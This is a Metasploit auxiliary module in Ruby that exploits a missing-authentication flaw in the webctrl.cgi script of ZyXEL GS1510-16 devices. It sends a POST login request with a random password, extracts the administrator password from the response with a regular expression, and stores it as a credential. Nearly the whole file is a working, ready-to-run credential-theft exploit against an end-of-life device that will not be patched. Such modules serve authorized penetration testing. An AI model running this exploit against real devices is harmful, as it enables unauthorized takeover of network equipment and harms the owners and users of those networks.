##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name' => 'ZyXEL GS1510-16 Password Extractor',
      'Description' => %q{
          This module exploits a vulnerability in ZyXEL GS1510-16 routers
          to extract the admin password. Due to a lack of authentication on the
          webctrl.cgi script, unauthenticated attackers can recover the
          administrator password for these devices. The vulnerable device
          has reached end of life for support from the manufacturer, so it is
          unlikely this problem will be addressed.
      },
      'References' => [
        [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/2709' ]
      ],
      'Author' => [
        'Daniel Manser', # @antsygeek
        'Sven Vetsch' # @disenchant_ch
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    )
  end

  def run
    print_status("Trying to get 'admin' user password ...")
    res = send_request_cgi({
      'uri' => '/webctrl.cgi',
      'method' => 'POST',
      'vars_post' => {
        'username' => 'admin',
        'password' => Rex::Text.rand_text_alphanumeric(rand(4..7)).to_s,
        'action' => 'cgi_login'
      }
    }, 10)

    if res && res.code == 200
      print_status('Got response from router.')
    else
      print_error('Unexpected HTTP response code.')
      return
    end
    admin_password_matches = res.body.match(/show_user\(1,"admin","(.+)"/)

    if !admin_password_matches
      print_error('Could not obtain admin password')
      return
    end

    admin_password = admin_password_matches[1]
    print_good("Password for user 'admin' is: #{admin_password}")

    connection_details = {
      module_fullname: fullname,
      username: 'admin',
      private_data: admin_password,
      private_type: :password,
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: res.body
    }.merge(service_details)
    create_credential_and_login(connection_details) # makes service_name more consistent
  rescue ::Rex::ConnectionError
    print_error("#{rhost}:#{rport} - Failed to connect")
    return
  end
end
